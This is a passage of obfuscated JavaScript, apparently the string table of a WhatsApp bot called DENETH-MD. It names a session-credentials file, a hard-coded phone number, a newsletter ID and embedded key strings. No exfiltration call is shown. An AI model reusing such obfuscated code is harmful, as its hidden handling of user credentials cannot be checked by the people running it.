teFile','includes','using\x20WA\x20v','true','error','mtype','caption','composing','https','forEach','writeFileSync','image','Deneth','endsWith','available','*Kunuhrp\x20tahanam!!*','Safari','1238655qYjAav','photo','open','sendButtonMessage','text','DENETH-MD','audio/mpeg','mimetype','find','length','\x20\x20\x20','footer','unavailable','commands','reactionMessage','interactiveResponseMessage','loggedOut','templateButtonReplyMessage','Plugins\x20Installing...🔄','13267122vsiXed','AUTO_RECORDING','Unsupported\x20media\x20type:','/auth_info_baileys/','PLUGIN\x20ERROR...⛔\x20','120363192956026815@newsletter','evpn','body','output','ᴀ\x20ᴡᴏʀʟᴅ\x20ᴘᴏᴡᴇʀꜰᴜʟʟ\x20ᴡʜᴀᴛꜱᴀᴘᴘ\x20ʙᴏᴛ','listen','qrcode-terminal','edit','SESSION_ID','OWNER','Message','message','@s.whatsapp.net','contextInfo','Bloody','split','pino','readMessages','download','2989827lORvzt','DENETH-MD\x20Connecting...🔄','subject','get','22906eNWAwv','fromBuffer','head','𝐃𝐄𝐍𝐄𝐓𝐇-𝐌𝐃\x20𝐕𝟏','video/mp4','*ᴅᴇɴᴇᴛʜ-ᴍᴅ\x20ᴠ1\x20ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ\x20ᴄᴏɴɴᴇᴄᴛᴇᴅ*\x20✓\x0a•\x20ɢɪᴛʜᴜʙ*\x20:\x20https://github.com/denethhansaka\x0a•\x20ᴊᴏɪɴ\x20ᴏᴜʀ\x20sᴜᴘᴘᴏʀᴛ\x20ɢʀᴏᴜᴘ\x20ᴠɪᴀ\x20ᴛʏᴘᴇ:\x20.joinsup\x0a>\x20ᴘᴏᴡᴇʀᴇᴅ\x20ʙʏ\x20ᴅᴇɴᴇᴛʜ-ᴍᴅ\x20ᴠ1\x20ᴡʜᴀᴛꜱᴀᴘᴘ\x20ʙᴏᴛ®','device','nativeFlowResponseMessage','test','msg','./lib/functions','from','ext','49bOLDkh','express','connection.update','imageMessage','node-cache','NEBULA=','function','startsWith','stanzaId','quoted','K+Bkh4AGLJTffSvs63DuMZumwquU014W8XsaWvfakPM=','pushName','PORT','object','react','RZ3iF3NexfIjD1MB9EfJhMo/xcBZnbEZ/gVSuxlrHWE=','slice','dapan','/auth_info_baileys/creds.json','content-type','https://github.com/denethhansaka/DENETH-MD-Files/blob/main/images/Main.jpg?raw=true','6332FosLwa',',\x20isLatest:\x20','cyan','https://github.com/denethhansaka','replace','format','Plugins\x20Installed\x20SuccessFully\x20✅','audio','94763596949','stickerMessage','toLowerCase','----------------------------------------------------','pattern','STATUS_VIEW'];_0x3bb5=function(){return _0xde0d96;};return _0x3bb5();}